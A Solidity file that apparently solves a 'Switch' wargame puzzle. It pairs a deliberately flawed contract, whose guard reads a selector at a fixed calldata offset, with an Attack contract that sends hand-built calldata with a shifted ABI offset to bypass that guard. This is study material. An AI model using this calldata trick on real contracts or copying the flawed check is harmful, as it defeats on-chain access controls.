// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata (68 = 0x44)
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }

    // 0x30c13ade
    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    // 0x76227e12
    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    // 0x20606e15
    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}

contract Attack {
    function attack(address target) external {
        // 30c13ade
        // 0x04 (0x00) 0000000000000000000000000000000000000000000000000000000000000060
        // 0x24 (0x20) 0000000000000000000000000000000000000000000000000000000000000000
        // 0x44 (0x40) 20606e1500000000000000000000000000000000000000000000000000000000
        // 0x64 (0x60) 0000000000000000000000000000000000000000000000000000000000000020
        // 0x84 (0x80) 76227e1200000000000000000000000000000000000000000000000000000000

        bytes memory data = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002076227e1200000000000000000000000000000000000000000000000000000000";
        (bool success, ) = target.call(data);
        require(success);
    }
}